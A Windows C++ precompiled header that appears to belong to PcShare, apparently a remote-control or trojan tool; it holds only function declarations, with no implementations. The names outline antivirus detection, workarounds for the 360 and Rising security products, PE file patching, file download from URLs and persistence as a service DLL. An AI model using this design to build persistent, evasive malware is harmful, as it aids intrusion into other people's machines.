// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__FF92BA34_7FC7_4854_9C78_0F5924613CDD__INCLUDED_)
#define AFX_STDAFX_H__FF92BA34_7FC7_4854_9C78_0F5924613CDD__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define WINVER 0x0501		//为 Windows98 和 Windows 2000 及更新版本改变为适当的值。
#define _WIN32_WINNT 0x0501		//为 Windows98 和 Windows 2000 及更新版本改变为适当的值。
#define _WIN32_IE 0x0501	//为 IE 5.0 及更新版本改变为适当的值。
//
//	Header Files and import library
//
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers
#include <windows.h>

#include "..\PcShare\MyMarco.h"
#include "MyFunc.h"

typedef void (WINAPI* SERVICEMAINPCMAKE)(ULONG, LPTSTR*);
typedef void (WINAPI* SERVICEMAINPCMAIN)(HWND hwnd, HINSTANCE hinst, char* sCmdLines, int nCmdShow);

void StartFunc(char* pFuncName);
void MakeStartInfo(char* pDllPath, char* pFileName);
void DoMainWork(DWORD nParentThreadId);
int  ReportStatus(DWORD dState, DWORD dCode, DWORD dwWaitHint);
void WINAPI ServiceCtrl(DWORD code);
void CheckKillSoft();
BOOL GetFileSaveInfoFromMoudle();
void Make360RegStartTempFile(char* pDllPath, char* pFileName);
BOOL CopyMyFileToDesDir(char* pDesFilePath);
BOOL ReadMyFile(LPCTSTR m_FileName, BYTE** pFileData, DWORD* nFileLen);
BOOL GetFileSaveInfo(LPVOID pInfoData);
BOOL AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile);
void MyRegSetKeyGroup(LPCTSTR AppName);
void MyRegSetKeyDescription(TCHAR* pKeyName, LPCTSTR m_KeyValue);
void MyRegSetKeyStart(TCHAR* pKeyName, DWORD m_KeyValue);
void MyRegSetKeyServiceDll(TCHAR* pKeyName, TCHAR* Value);
BOOL GetUrlFile(char* pUrlPath, char* m_FilePath);
BOOL WriteMyFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen);
void MakeRavStartInfo(char* pDesPathName);
void Make360StartInfo();
void GetMoudleMame(DWORD pId, TCHAR* pExeName);
BOOL InstallMyService();
BOOL StartMyService(char* pServiceName);
BOOL MakeService();
void ModifyService();

DWORD DoMainWorkThread(LPVOID lPvoid);

//void ShowText(char* pText);

// TODO: reference additional headers your program requires here
//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__FF92BA34_7FC7_4854_9C78_0F5924613CDD__INCLUDED_)
